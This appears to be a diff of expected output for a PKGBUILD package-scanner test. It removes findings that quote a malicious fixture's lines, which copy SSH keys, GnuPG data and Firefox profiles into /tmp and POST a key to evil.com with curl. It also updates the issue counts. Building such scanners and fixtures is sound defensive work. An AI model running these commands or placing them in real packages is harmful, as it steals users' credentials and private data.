@@ -30,31 +30,6 @@ Scan Results: malicious-credential-theft
     Recommendation: Build/install should not send data externally
     Reference: CWE-200
 
-[CRITICAL] EXFIL-001 Curl POST data exfiltration
-    Sending data to external servers via curl POST
-    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:23
-    Code:     curl -X POST -d @/tmp/stolen_key https://evil.com/collect
-    Recommendation: Build/install should not send data externally
-    Reference: CWE-200
-
-[HIGH] HIDDEN-001 Hidden file creation in home
-    Creating hidden files in user home directory
-    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:14
-    Code:     cat ~/.ssh/id_rsa > /tmp/stolen_key
-    Recommendation: Packages should not create hidden files in user home
-
-[HIGH] HIDDEN-001 Hidden file creation in home
-    Creating hidden files in user home directory
-    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:17
-    Code:     tar -czf /tmp/gpg.tar.gz ~/.gnupg/
-    Recommendation: Packages should not create hidden files in user home
-
-[HIGH] HIDDEN-001 Hidden file creation in home
-    Creating hidden files in user home directory
-    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:20
-    Code:     cp -r ~/.mozilla/firefox /tmp/firefox_profile
-    Recommendation: Packages should not create hidden files in user home
-
 [HIGH] FUNC-001 Network access in build function
     Function 'build' contains network access command 'curl'
     Location: tests/fixtures/malicious/credential-theft/PKGBUILD:12
@@ -68,10 +43,10 @@ Scan Results: malicious-credential-theft
 
 ============================================================
 Package: malicious-credential-theft v1.0.0-1
-Scan duration: 6ms
+Scan duration: 20ms
 
-Found 10 issue(s):
-  5 CRITICAL
-  4 HIGH
+Found 6 issue(s):
+  4 CRITICAL
+  1 HIGH
   1 MEDIUM
 ============================================================
